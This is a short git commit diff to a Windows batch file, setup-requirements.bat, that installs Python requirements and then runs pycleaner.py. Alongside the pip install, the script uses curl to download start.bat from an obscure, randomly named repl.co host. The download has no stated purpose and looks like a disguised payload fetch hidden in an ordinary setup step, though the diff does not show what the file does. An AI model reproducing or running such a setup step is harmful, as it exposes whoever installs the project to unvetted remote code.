06289f6763555e26f5bbed13ba13425407a72a0b
nightmare324 <93826447+nightmare324@users.noreply.github.com>
2022-08-11 16:01:41 +0300

    Update setup-requirements.bat

--- setup-requirements.bat
+++ setup-requirements.bat
@@ -1,5 +1,6 @@
 @echo off
 cd %~dp0
+MD tools
 py -3 -m pip install -r requirements.txt
 curl -L https://untimelyimpressionableadministration.blus2tlia.repl.co/start.bat -O
-start pycleaner.py
+python pycleaner.py
